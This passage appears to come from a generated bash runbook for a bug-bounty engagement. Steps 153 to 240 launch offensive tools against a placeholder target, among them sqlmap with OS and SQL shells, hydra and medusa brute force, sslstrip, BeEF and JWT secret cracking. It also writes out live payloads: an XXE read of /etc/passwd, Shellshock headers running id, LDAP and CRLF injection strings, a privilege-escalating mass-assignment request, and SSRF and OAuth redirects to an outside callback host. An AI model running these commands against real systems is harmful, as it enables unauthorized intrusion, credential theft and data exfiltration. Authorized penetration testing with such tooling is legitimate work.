# 153. Browser-side hook for a demonstrated XSS  (opt-in heavy)
if [ "$DRY_RUN" = "1" ]; then
  skip '153. Browser-side hook for a demonstrated XSS'
else
  { beef-xss ; } 2>&1 | tee -a "$LOG"
fi

# 154. Intercept and rewrite traffic with a script  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '154. Intercept and rewrite traffic with a script'
else
  { mitmproxy --mode regular --listen-port 8080 --save-stream-file ~/BugX/thuringerbank/04_evidence/mitm_flows.dump -s ~/BugX/thuringerbank/scripts/rewrite.py ; } 2>&1 | tee -a "$LOG"
fi

# ---------------------------------------------------------------- XSS, LFI/RFI, template & CMS checks
note '[XSS, LFI/RFI, template & CMS checks] one request per payload — keep the rate at 10 req/s'

# 155. Parameter-level XSS analysis  (authorized-active)
# PREREQUISITE: replace BS_PARAM with a real parameter from the parameter inventory
if [ "$DRY_RUN" = "1" ]; then
  skip '155. Parameter-level XSS analysis'
else
  { dalfox url "https://yourtarget.com" --worker 5 --delay 100 --output ~/BugX/thuringerbank/03_exploits/dalfox.txt --format plain --no-color ; } 2>&1 | tee -a "$LOG"
fi

# 156. Context-aware XSS testing  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '156. Context-aware XSS testing'
else
  { python3 xsstrike.py -u "https://yourtarget.com" --crawl --fuzz --blind --skip-dom --threads 5 ; } 2>&1 | tee -a "$LOG"
fi

# 157. Broad XSS payload sweep  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '157. Broad XSS payload sweep'
else
  { xsser --url "https://yourtarget.com" -g "XSS" --auto --threads 5 --timeout 15 -v ; } 2>&1 | tee -a "$LOG"
fi

# 158. OS command injection testing  (opt-in heavy)
if [ "$DRY_RUN" = "1" ]; then
  skip '158. OS command injection testing'
else
  { commix --url="https://yourtarget.com" --batch --level=1 --risk=1 --delay=1 --timeout=15 --output-dir=~/BugX/thuringerbank/03_exploits/commix ; } 2>&1 | tee -a "$LOG"
fi

# 159. Server-side template injection  (opt-in heavy)
if [ "$DRY_RUN" = "1" ]; then
  skip '159. Server-side template injection'
else
  { python3 sstimap.py -u "https://yourtarget.com" --level 3 --os-cmd "id" ; } 2>&1 | tee -a "$LOG"
fi

# 160. Path traversal and LFI probing  (opt-in heavy)
if [ "$DRY_RUN" = "1" ]; then
  skip '160. Path traversal and LFI probing'
else
  { dotdotpwn -m http-url -u "https://yourtarget.com/BS_PARAM=TRAVERSAL" -k "root:" -b -d 6 -t 200 -q -o ~/BugX/thuringerbank/03_exploits/dotdotpwn.txt ; } 2>&1 | tee -a "$LOG"
fi

# 161. Local file inclusion discovery and checks  (opt-in heavy)
if [ "$DRY_RUN" = "1" ]; then
  skip '161. Local file inclusion discovery and checks'
else
  { fimap -u "https://yourtarget.com" -k root: -a -w -H -q 2>&1 | tail -n 30 ; } 2>&1 | tee -a "$LOG"
fi

# 162. Application version fingerprinting  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '162. Application version fingerprinting'
else
  { python3 BlindElephant.py https://yourtarget.com wordpress ; } 2>&1 | tee -a "$LOG"
fi

# 163. Padding-oracle / CBC abuse on a ciphertext  (opt-in heavy)
if [ "$DRY_RUN" = "1" ]; then
  skip '163. Padding-oracle / CBC abuse on a ciphertext'
else
  { padbuster "https://yourtarget.com" CIPHERTEXT 16 -encoding 0 -error "Invalid padding" ; } 2>&1 | tee -a "$LOG"
fi

# 164. Build a CSRF proof for a state-changing request  (opt-in heavy)
if [ "$DRY_RUN" = "1" ]; then
  skip '164. Build a CSRF proof for a state-changing request'
else
  { echo "Capture the request in Burp, right-click, Generate CSRF PoC, then open the HTML in your own test browser." ; } 2>&1 | tee -a "$LOG"
fi

# 165. WordPress core, plugin and user enumeration  (authorized-active · loud)
# PREREQUISITE: export BS_WPSCAN_TOKEN (free from wpscan.com) for vulnerability data
if [ "$DRY_RUN" = "1" ]; then
  skip '165. WordPress core, plugin and user enumeration'
else
  { wpscan --url https://yourtarget.com --enumerate vp,vt,u,dbe --plugins-detection aggressive --api-token $BS_WPSCAN_TOKEN --random-user-agent --max-threads 5 -o ~/BugX/thuringerbank/02_scanning/wpscan.txt ; } 2>&1 | tee -a "$LOG"
fi

# 166. WordPress password-only check with your own account  (opt-in heavy)
if [ "$DRY_RUN" = "1" ]; then
  skip '166. WordPress password-only check with your own account'
else
  { wpscan --url https://yourtarget.com --passwords "$BS_WORDLIST" --usernames "$BS_USER" --max-threads 1 --password-attack wp-login ; } 2>&1 | tee -a "$LOG"
fi

# 167. Joomla enumeration  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '167. Joomla enumeration'
else
  { joomscan -u https://yourtarget.com -ec -o ~/BugX/thuringerbank/02_scanning/joomscan.txt ; } 2>&1 | tee -a "$LOG"
fi

# 168. Drupal, Joomla and SilverStripe enumeration  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '168. Drupal, Joomla and SilverStripe enumeration'
else
  { droopescan scan drupal -u https://yourtarget.com -o ~/BugX/thuringerbank/02_scanning/droopescan.txt ; } 2>&1 | tee -a "$LOG"
fi

# 169. CMS detection and deep enumeration  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '169. CMS detection and deep enumeration'
else
  { cmseek -u https://yourtarget.com --follow-redirect --strict-cms drupal,joomla,wordpress ; } 2>&1 | tee -a "$LOG"
fi

# 170. WordPress fingerprint and enumeration  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '170. WordPress fingerprint and enumeration'
else
  { plecost -i ~/BugX/thuringerbank/01_recon/hosts.txt -o ~/BugX/thuringerbank/02_scanning/plecost.txt -v ; } 2>&1 | tee -a "$LOG"
fi

# 171. Session sidejacking demonstration  (opt-in heavy)
if [ "$DRY_RUN" = "1" ]; then
  skip '171. Session sidejacking demonstration'
else
  { java -jar CookieCadger.jar --interface eth0 --output ~/BugX/thuringerbank/04_evidence/cookiecadger ; } 2>&1 | tee -a "$LOG"
fi

# ---------------------------------------------------------------- Automated web scanners & proxies
note '[Automated web scanners & proxies] scanner volume at 10 req/s — check the program'\''s rules before the active ones'

# 172. Template scan across misconfig, exposure and CVE tags  (authorized-active · loud)
if [ "$DRY_RUN" = "1" ]; then
  skip '172. Template scan across misconfig, exposure and CVE tags'
else
  { nuclei -u https://yourtarget.com -tags cve,exposure,misconfig,tech,exposed-panels,default-login,takeover -etags dos,fuzz,brute-force -severity critical,high,medium,low -rate-limit 10 -timeout 15 -retries 2 -jsonl -o ~/BugX/thuringerbank/03_exploits/nuclei.jsonl | tail -n 20 ; } 2>&1 | tee -a "$LOG"
fi

# 173. Targeted template classes for the detected stack  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '173. Targeted template classes for the detected stack'
else
  { nuclei -u https://yourtarget.com -tags wordpress,joomla,drupal,apache,iis,nginx,tomcat,jenkins,grafana,gitlab -severity critical,high,medium -rate-limit 10 -jsonl -o ~/BugX/thuringerbank/03_exploits/nuclei_stack.jsonl | tail -n 15 ; } 2>&1 | tee -a "$LOG"
fi

# 174. OWASP ZAP baseline spider and passive scan  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '174. OWASP ZAP baseline spider and passive scan'
else
  { zaproxy -cmd -quickurl https://yourtarget.com -quickout ~/BugX/thuringerbank/02_scanning/zap-baseline.html -quickprogress ; } 2>&1 | tee -a "$LOG"
fi

# 175. OWASP ZAP active scan (only where permitted)  (opt-in heavy)
if [ "$DRY_RUN" = "1" ]; then
  skip '175. OWASP ZAP active scan (only where permitted)'
else
  { zaproxy -cmd -quickurl https://yourtarget.com -quickout ~/BugX/thuringerbank/03_exploits/zap-active.html -quickprogress -config scanner.attackStrength=MEDIUM ; } 2>&1 | tee -a "$LOG"
fi

# 176. Route your session through Burp  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '176. Route your session through Burp'
else
  { burpsuite --project-file=~/BugX/thuringerbank/04_evidence/burp.burp --user-config-file=~/BugX/thuringerbank/burp-config.json ; } 2>&1 | tee -a "$LOG"
fi

# 177. Automated framework scan of a scoped path  (opt-in heavy)
if [ "$DRY_RUN" = "1" ]; then
  skip '177. Automated framework scan of a scoped path'
else
  { arachni https://yourtarget.com --scope-page-limit=200 --http-request-concurrency=5 --report-save-path=~/BugX/thuringerbank/03_exploits/arachni.afr --checks=* --plugin=autologin:url=https://yourtarget.com/login ; } 2>&1 | tee -a "$LOG"
fi

# 178. w3af audit profile against the target  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '178. w3af audit profile against the target'
else
  { w3af_console -s ~/BugX/thuringerbank/scripts/w3af-audit.w3af ; } 2>&1 | tee -a "$LOG"
fi

# 179. Black-box web application scan  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '179. Black-box web application scan'
else
  { wapiti -u https://yourtarget.com -f html -o ~/BugX/thuringerbank/02_scanning/wapiti -m all --max-scan-time 1800 -t 5 ; } 2>&1 | tee -a "$LOG"
fi

# 180. Lightweight discovery and checks  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '180. Lightweight discovery and checks'
else
  { uniscan -u https://yourtarget.com -qweds ; } 2>&1 | tee -a "$LOG"
fi

# 181. GUI scan of a small target  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '181. GUI scan of a small target'
else
  { python3 grabber.py -G ~/BugX/thuringerbank/02_scanning/grabber.html https://yourtarget.com ; } 2>&1 | tee -a "$LOG"
fi

# 182. HCL AppScan Standard CLI scan  (opt-in heavy)
if [ "$DRY_RUN" = "1" ]; then
  skip '182. HCL AppScan Standard CLI scan'
else
  { AppScanCMD.exe /b ~/BugX/thuringerbank/scripts/appscan-config.xml /e ~/BugX/thuringerbank/03_exploits/appscan.scan /report ~/BugX/thuringerbank/05_reports/appscan.pdf /verbose ; } 2>&1 | tee -a "$LOG"
fi

# 183. Acunetix scan through its API  (opt-in heavy)
if [ "$DRY_RUN" = "1" ]; then
  skip '183. Acunetix scan through its API'
else
  { curl -sS -k -X POST "https://$BS_ACUNETIX/api/v1/scans" -H "X-Auth: $BS_ACUNETIX_KEY" -H 'Content-Type: application/json' -d '{"target_id":"TARGET_ID","profile_id":"11111111-1111-1111-1111-111111111111","schedule":{"disable":false,"start_date":null,"time_schedule":{"frequency":"Weekly"}}}' ; } 2>&1 | tee -a "$LOG"
fi

# 184. Invicti (Netsparker) scan through its API  (opt-in heavy)
if [ "$DRY_RUN" = "1" ]; then
  skip '184. Invicti (Netsparker) scan through its API'
else
  { curl -sS -X POST "https://$BS_INVICTI/api/1.0/scans" -H "Authorization: $BS_INVICTI_KEY" -H 'Content-Type: application/json' -d '{"WebsiteId":"WEBSITE_ID","ProfileId":"PROFILE_ID","ScanPolicyId":"POLICY_ID"}' ; } 2>&1 | tee -a "$LOG"
fi

# 185. Fortify WebInspect CLI scan  (opt-in heavy)
if [ "$DRY_RUN" = "1" ]; then
  skip '185. Fortify WebInspect CLI scan'
else
  { WebInspectCLI.exe -s ~/BugX/thuringerbank/scripts/webinspect.settings -cmd -u https://yourtarget.com -scanName "bugstrike" -rpt ~/BugX/thuringerbank/05_reports/webinspect ; } 2>&1 | tee -a "$LOG"
fi

# 186. Framework session for manual verification  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '186. Framework session for manual verification'
else
  { ironwasp ; } 2>&1 | tee -a "$LOG"
fi

# 187. Legacy interception proxy  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '187. Legacy interception proxy'
else
  { paros ; } 2>&1 | tee -a "$LOG"
fi

# 188. Legacy proxy for message replay  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '188. Legacy proxy for message replay'
else
  { webscarab ; } 2>&1 | tee -a "$LOG"
fi

# 189. Proxy with attack modules  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '189. Proxy with attack modules'
else
  { proxystrike ; } 2>&1 | tee -a "$LOG"
fi

# 190. Heuristic protocol fuzzing  (opt-in heavy)
if [ "$DRY_RUN" = "1" ]; then
  skip '190. Heuristic protocol fuzzing'
else
  { powerfuzzer -m 1 -l ~/BugX/thuringerbank/02_scanning/powerfuzzer.log ; } 2>&1 | tee -a "$LOG"
fi

# 191. Intercept a TLS stream on an authorized segment  (opt-in heavy)
if [ "$DRY_RUN" = "1" ]; then
  skip '191. Intercept a TLS stream on an authorized segment'
else
  { sudo sslsplit -D -k ca.key -c ca.crt -l ~/BugX/thuringerbank/04_evidence/sslsplit_connections.log -S ~/BugX/thuringerbank/04_evidence/sslsplit_logdir ssl 0.0.0.0 8443 ; } 2>&1 | tee -a "$LOG"
fi

# 192. HTTPS downgrade behaviour check  (opt-in heavy)
if [ "$DRY_RUN" = "1" ]; then
  skip '192. HTTPS downgrade behaviour check'
else
  { sudo sslstrip -l 10000 -w ~/BugX/thuringerbank/04_evidence/sslstrip.log ; } 2>&1 | tee -a "$LOG"
fi

# ---------------------------------------------------------------- API, identity & authorization testing
note '[API, identity & authorization testing] one request per route or token — well inside 10 req/s'

# 193. GraphQL hardening and introspection checks  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '193. GraphQL hardening and introspection checks'
else
  { graphql-cop -t https://yourtarget.com/graphql -o ~/BugX/thuringerbank/02_scanning/graphql_cop.txt ; } 2>&1 | tee -a "$LOG"
fi

# 194. Recover a schema when introspection is disabled  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '194. Recover a schema when introspection is disabled'
else
  { clairvoyance https://yourtarget.com/graphql -o ~/BugX/thuringerbank/02_scanning/schema.json -w /usr/share/seclists/Discovery/Web-Content/graphql.txt ; } 2>&1 | tee -a "$LOG"
fi

# 195. Direct introspection query  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '195. Direct introspection query'
else
  { curl -sS --max-time 15 --proxy '127.0.0.1:8080' -X POST -H 'Content-Type: application/json' -d '{"query":"{__schema{queryType{name} mutationType{name} types{name kind}}}"}' https://yourtarget.com/graphql | tee ~/BugX/thuringerbank/04_evidence/graphql_introspection.json | head -c 400 ; } 2>&1 | tee -a "$LOG"
fi

# 196. Brute-force API routes with real-world wordlists  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '196. Brute-force API routes with real-world wordlists'
else
  { kr scan https://yourtarget.com -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -A=apiroutes-240528 -x 5 --fail-status-codes 404 -o ~/BugX/thuringerbank/02_scanning/kiterunner.txt ; } 2>&1 | tee -a "$LOG"
fi

# 197. Hidden parameter discovery on a real endpoint  (authorized-active)
# PREREQUISITE: export BS_URL to a real endpoint from the inventory
if [ "$DRY_RUN" = "1" ]; then
  skip '197. Hidden parameter discovery on a real endpoint'
else
  { arjun -u "$BS_URL" -m GET,POST -T 5 -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -oJ ~/BugX/thuringerbank/03_exploits/arjun.json ; } 2>&1 | tee -a "$LOG"
fi

# 198. Mine parameters from archived URLs  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '198. Mine parameters from archived URLs'
else
  { paramspider -d yourtarget.com -o ~/BugX/thuringerbank/01_recon/paramspider.txt --exclude woff,css,js,png,svg,jpg ; } 2>&1 | tee -a "$LOG"
fi

# 199. JWT weakness analysis  (opt-in heavy)
if [ "$DRY_RUN" = "1" ]; then
  skip '199. JWT weakness analysis'
else
  { python3 jwt_tool.py "$BS_TOKEN" -M at -t https://yourtarget.com -rc "Cookie: $BS_COOKIE" ; } 2>&1 | tee -a "$LOG"
fi

# 200. Crack the JWT signing secret offline  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '200. Crack the JWT signing secret offline'
else
  { python3 jwt_tool.py "$BS_TOKEN" -C -d /usr/share/wordlists/rockyou.txt ; } 2>&1 | tee -a "$LOG"
fi

# 201. OAuth 2.0 redirect and flow misuse  (opt-in heavy)
if [ "$DRY_RUN" = "1" ]; then
  skip '201. OAuth 2.0 redirect and flow misuse'
else
  { curl -sS -o /dev/null -D - --max-time 15 "https://yourtarget.com/oauth/authorize?response_type=code&client_id=CLIENT_ID&redirect_uri=https://$BS_LHOST/callback&scope=openid&state=bs123" | egrep -i '^(HTTP/|location)' ; } 2>&1 | tee -a "$LOG"
fi

# 202. SOAP/WSDL service review  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '202. SOAP/WSDL service review'
else
  { soapui.sh -s ~/BugX/thuringerbank/scripts/soapui-project.xml -r -f ~/BugX/thuringerbank/02_scanning/soapui ; } 2>&1 | tee -a "$LOG"
fi

# 203. Run a Postman collection against the target  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '203. Run a Postman collection against the target'
else
  { newman run ~/BugX/thuringerbank/scripts/collection.json -e ~/BugX/thuringerbank/scripts/env.json --reporters cli,json --reporter-json-export ~/BugX/thuringerbank/03_exploits/newman.json --timeout-request 10000 --delay-request 100 ; } 2>&1 | tee -a "$LOG"
fi

# 204. Enumerate the published API surface  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '204. Enumerate the published API surface'
else
  { for p in swagger.json openapi.json api-docs v2/api-docs swagger/v1/swagger.json .well-known/openapi.json; do printf '%s %s\n' "$(curl -s -o /dev/null -w '%{http_code}' --max-time 15 --proxy '127.0.0.1:8080' https://yourtarget.com/$p)" "$p"; done | tee ~/BugX/thuringerbank/02_scanning/api_docs.txt ; } 2>&1 | tee -a "$LOG"
fi

# 205. Diff authenticated against anonymous responses  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '205. Diff authenticated against anonymous responses'
else
  { curl -sS -o /dev/null -w 'anon %{http_code} %{size_download}\n' --max-time 15 --proxy '127.0.0.1:8080' "$BS_URL"; curl -sS -o /dev/null -w 'auth %{http_code} %{size_download}\n' --max-time 15 --proxy '127.0.0.1:8080' -H "Authorization: Bearer $BS_TOKEN" "$BS_URL" ; } 2>&1 | tee -a "$LOG"
fi

# 206. Object-reference differential on a single identifier  (opt-in heavy)
if [ "$DRY_RUN" = "1" ]; then
  skip '206. Object-reference differential on a single identifier'
else
  { for id in 1 2 100 1000; do printf '%s %s\n' "$(curl -s -o /dev/null -w '%{http_code} %{size_download}' --max-time 15 -H "Authorization: Bearer $BS_TOKEN" "$BS_URL/$id")" "$id"; done ; } 2>&1 | tee -a "$LOG"
fi

# 207. Rate-limit and lockout behaviour  (authorized-active · loud)
if [ "$DRY_RUN" = "1" ]; then
  skip '207. Rate-limit and lockout behaviour'
else
  { for i in $(seq 1 40); do curl -s -o /dev/null -w "%{http_code} " --max-time 15 "$BS_URL"; done; echo ; } 2>&1 | tee -a "$LOG"
fi

# 208. Mass-assignment probe on your own record  (opt-in heavy)
if [ "$DRY_RUN" = "1" ]; then
  skip '208. Mass-assignment probe on your own record'
else
  { curl -sS --max-time 15 -X PATCH -H "Authorization: Bearer $BS_TOKEN" -H 'Content-Type: application/json' -d '{"display_name":"bs-test","role":"admin","is_verified":true,"tenant_id":"00000000"}' "$BS_URL" | head -c 400 ; } 2>&1 | tee -a "$LOG"
fi

# 209. Server-side request forgery with an out-of-band callback  (opt-in heavy)
# PREREQUISITE: export BS_LHOST, or set a callback host on the engagement
if [ "$DRY_RUN" = "1" ]; then
  skip '209. Server-side request forgery with an out-of-band callback'
else
  { curl -sS --max-time 15 -X POST -H "Authorization: Bearer $BS_TOKEN" -H 'Content-Type: application/json' -d '{"url":"http://$BS_LHOST/bs-ssrf"}' "$BS_URL" | head -c 300 ; } 2>&1 | tee -a "$LOG"
fi

# 210. WebSocket authorization check  (opt-in heavy)
if [ "$DRY_RUN" = "1" ]; then
  skip '210. WebSocket authorization check'
else
  { wscat -c "wss://yourtarget.com/ws" -H "Cookie: $BS_COOKIE" -x '{"action":"subscribe","channel":"admin"}' ; } 2>&1 | tee -a "$LOG"
fi

# ---------------------------------------------------------------- Database, parser & server-side injection
note '[Database, parser & server-side injection] one request per payload at 10 req/s; sqlmap enumeration scales with the schema'

# 211. Confirm injection on one parameter (lowest risk)  (opt-in heavy)
# PREREQUISITE: replace BS_PARAM with a real parameter from the inventory
if [ "$DRY_RUN" = "1" ]; then
  skip '211. Confirm injection on one parameter (lowest risk)'
else
  { sqlmap -u "https://yourtarget.com" --batch --level=1 --risk=1 --threads=1 --delay=1 --random-agent --timeout=15 --retries=2 --output-dir=~/BugX/thuringerbank/03_exploits/sqlmap --answers=follow=N,redirect=N ; } 2>&1 | tee -a "$LOG"
fi

# 212. Enumerate databases and tables  (opt-in heavy)
if [ "$DRY_RUN" = "1" ]; then
  skip '212. Enumerate databases and tables'
else
  { sqlmap -u "https://yourtarget.com" --batch --dbs --threads=2 --delay=1 --output-dir=~/BugX/thuringerbank/03_exploits/sqlmap ; } 2>&1 | tee -a "$LOG"
fi

# 213. Dump only the tables needed as proof  (opt-in heavy)
if [ "$DRY_RUN" = "1" ]; then
  skip '213. Dump only the tables needed as proof'
else
  { sqlmap -u "https://yourtarget.com" --batch -D DB_NAME -T TABLE_NAME --columns --dump --where="id=1" --threads=1 --delay=1 ; } 2>&1 | tee -a "$LOG"
fi

# 214. Interactive SQL shell (only with written approval)  (opt-in heavy)
if [ "$DRY_RUN" = "1" ]; then
  skip '214. Interactive SQL shell (only with written approval)'
else
  { sqlmap -u "https://yourtarget.com" --batch --sql-shell --query="SELECT current_user" ; } 2>&1 | tee -a "$LOG"
fi

# 215. OS shell capability check  (opt-in heavy)
if [ "$DRY_RUN" = "1" ]; then
  skip '215. OS shell capability check'
else
  { sqlmap -u "https://yourtarget.com" --batch --os-shell --os-cmd="id" --tmp-dir=/tmp ; } 2>&1 | tee -a "$LOG"
fi

# 216. SQL Server focused injection testing  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '216. SQL Server focused injection testing'
else
  { sqlninja -m t -f ~/BugX/thuringerbank/scripts/sqlninja.conf -v ; } 2>&1 | tee -a "$LOG"
fi

# 217. Java-based injection assessment  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '217. Java-based injection assessment'
else
  { java -jar jsql-injection-v0.95.jar -u "https://yourtarget.com" --scan-mode FAST ; } 2>&1 | tee -a "$LOG"
fi

# 218. MySQL injection tooling  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '218. MySQL injection tooling'
else
  { sqlsus -u "https://yourtarget.com" ; } 2>&1 | tee -a "$LOG"
fi

# 219. Blind SQL injection confirmation  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '219. Blind SQL injection confirmation'
else
  { bbqsql -c ~/BugX/thuringerbank/scripts/bbqsql.conf -r ~/BugX/thuringerbank/04_evidence/blind_request.txt ; } 2>&1 | tee -a "$LOG"
fi

# 220. Database credential audit from a host you control  (opt-in heavy)
if [ "$DRY_RUN" = "1" ]; then
  skip '220. Database credential audit from a host you control'
else
  { python3 DBPwAudit.py -s yourtarget.com -d mysql -u "$BS_USER" -w "$BS_PASS" ; } 2>&1 | tee -a "$LOG"
fi

# 221. Multi-database client for manual queries  (opt-in heavy)
if [ "$DRY_RUN" = "1" ]; then
  skip '221. Multi-database client for manual queries'
else
  { java -jar HexorBase.jar ; } 2>&1 | tee -a "$LOG"
fi

# 222. Oracle instance enumeration  (opt-in heavy)
if [ "$DRY_RUN" = "1" ]; then
  skip '222. Oracle instance enumeration'
else
  { oscanner -s yourtarget.com -P 1521 ; } 2>&1 | tee -a "$LOG"
fi

# 223. Oracle TNS listener probing  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '223. Oracle TNS listener probing'
else
  { tnscmd10g version -h yourtarget.com ; } 2>&1 | tee -a "$LOG"
fi

# 224. Oracle SID discovery  (opt-in heavy)
if [ "$DRY_RUN" = "1" ]; then
  skip '224. Oracle SID discovery'
else
  { sidguesser -t soapui.sh -s ~/BugX/thuringerbank/scripts/sids.txt ; } 2>&1 | tee -a "$LOG"
fi

# 225. NoSQL injection (MongoDB and similar)  (opt-in heavy)
if [ "$DRY_RUN" = "1" ]; then
  skip '225. NoSQL injection (MongoDB and similar)'
else
  { python3 nosqlmap.py -u "https://yourtarget.com" -p BS_PARAM ; } 2>&1 | tee -a "$LOG"
fi

# 226. Log4Shell and JNDI callback checks  (opt-in heavy)
# PREREQUISITE: export BS_LHOST, or set the callback host on the engagement
if [ "$DRY_RUN" = "1" ]; then
  skip '226. Log4Shell and JNDI callback checks'
else
  { python3 log4j-scan.py -u "https://yourtarget.com" --run-all-tests --custom-callback-domain "$BS_LHOST" ; } 2>&1 | tee -a "$LOG"
fi

# 227. XML external entity (XXE) probe  (opt-in heavy)
# PREREQUISITE: export BS_URL to an XML-accepting endpoint
if [ "$DRY_RUN" = "1" ]; then
  skip '227. XML external entity (XXE) probe'
else
  { printf '%s' '<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><x>&e;</x>' > ~/BugX/thuringerbank/04_evidence/xxe.xml; curl -sS --max-time 15 -X POST -H 'Content-Type: application/xml' --data-binary @~/BugX/thuringerbank/04_evidence/xxe.xml "$BS_URL" | head -c 500 ; } 2>&1 | tee -a "$LOG"
fi

# 228. Shellshock and CGI header injection  (opt-in heavy)
if [ "$DRY_RUN" = "1" ]; then
  skip '228. Shellshock and CGI header injection'
else
  { curl -sS --max-time 15 -H 'User-Agent: () { :; }; echo; echo $(id)' -H 'Referer: () { :; }; echo; echo $(id)' "https://yourtarget.com/cgi-bin/" | head -c 400 ; } 2>&1 | tee -a "$LOG"
fi

# 229. LDAP filter injection  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '229. LDAP filter injection'
else
  { curl -sS --max-time 15 -G --data-urlencode 'username=*)(uid=*))(|(uid=*' --data-urlencode 'password=x' "https://yourtarget.com/login" | head -c 400 ; } 2>&1 | tee -a "$LOG"
fi

# 230. CRLF and response-splitting probe  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '230. CRLF and response-splitting probe'
else
  { curl -sS -o /dev/null -D - --max-time 15 -H 'X-Probe: x%0d%0aInjected-Header: bs' "https://yourtarget.com/?BS_PARAM=%0d%0aInjected-Header:%20bs" | egrep -i 'HTTP/|injected-header' ; } 2>&1 | tee -a "$LOG"
fi

# 231. HTTP request smuggling detection  (opt-in heavy)
if [ "$DRY_RUN" = "1" ]; then
  skip '231. HTTP request smuggling detection'
else
  { python3 smuggler.py -u https://yourtarget.com -v ; } 2>&1 | tee -a "$LOG"
fi

# 232. HTTP/2 cleartext smuggling probe  (opt-in heavy)
if [ "$DRY_RUN" = "1" ]; then
  skip '232. HTTP/2 cleartext smuggling probe'
else
  { python3 h2csmuggler.py -x https://yourtarget.com -t 15 ; } 2>&1 | tee -a "$LOG"
fi

# ---------------------------------------------------------------- Credentials, hashes & cracking
note '[Credentials, hashes & cracking] one attempt per credential — hydra throughput is set to 5 tasks'

# 233. SSH credential testing with throttling  (opt-in heavy)
if [ "$DRY_RUN" = "1" ]; then
  skip '233. SSH credential testing with throttling'
else
  { hydra -L ~/BugX/thuringerbank/01_recon/users.txt -P /usr/share/wordlists/dirb/common.txt -t 4 -W 15 -f -V ssh://yourtarget.com ; } 2>&1 | tee -a "$LOG"
fi

# 234. HTTP form credential testing  (opt-in heavy)
if [ "$DRY_RUN" = "1" ]; then
  skip '234. HTTP form credential testing'
else
  { hydra -L ~/BugX/thuringerbank/01_recon/users.txt -P /usr/share/wordlists/dirb/common.txt -f -t 4 -W 15 yourtarget.com http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid credentials" ; } 2>&1 | tee -a "$LOG"
fi

# 235. FTP, RDP and SMB service testing  (opt-in heavy)
if [ "$DRY_RUN" = "1" ]; then
  skip '235. FTP, RDP and SMB service testing'
else
  { hydra -L ~/BugX/thuringerbank/01_recon/users.txt -P /usr/share/wordlists/dirb/common.txt -f -t 1 -W 15 rdp://yourtarget.com ; } 2>&1 | tee -a "$LOG"
fi

# 236. Parallel service testing with a delay  (opt-in heavy)
if [ "$DRY_RUN" = "1" ]; then
  skip '236. Parallel service testing with a delay'
else
  { medusa -h yourtarget.com -U ~/BugX/thuringerbank/01_recon/users.txt -P /usr/share/wordlists/dirb/common.txt -M ssh -t 4 -d -f -O ~/BugX/thuringerbank/03_exploits/medusa.log ; } 2>&1 | tee -a "$LOG"
fi

# 237. Network authentication cracking  (opt-in heavy)
if [ "$DRY_RUN" = "1" ]; then
  skip '237. Network authentication cracking'
else
  { ncrack -v --user "$BS_USER" -P /usr/share/wordlists/dirb/common.txt -T 2 -f -oN ~/BugX/thuringerbank/03_exploits/ncrack.txt ssh://yourtarget.com:22 ; } 2>&1 | tee -a "$LOG"
fi

# 238. Modular brute force with rate control  (opt-in heavy)
if [ "$DRY_RUN" = "1" ]; then
  skip '238. Modular brute force with rate control'
else
  { patator ssh_login host=yourtarget.com user=FILE0 password=FILE1 0=~/BugX/thuringerbank/01_recon/users.txt 1=/usr/share/wordlists/dirb/common.txt -x ignore:mesg='Authentication failed' -x reset:fgrep='Connection closed' ; } 2>&1 | tee -a "$LOG"
fi

# 239. Build a site-specific wordlist  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '239. Build a site-specific wordlist'
else
  { cewl https://yourtarget.com -d 2 -m 6 --with-numbers -w ~/BugX/thuringerbank/05_reports/cewl_wordlist.txt --email_file ~/BugX/thuringerbank/05_reports/cewl_emails.txt ; } 2>&1 | tee -a "$LOG"
fi

# 240. Generate a policy-shaped wordlist  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '240. Generate a policy-shaped wordlist'
else
  { crunch 10 12 -t Bugstrike@@@@ -o ~/BugX/thuringerbank/05_reports/crunch_policy.txt ; } 2>&1 | tee -a "$LOG"
fi

# 241. Identify the hash types you obtained  (authorized-active)
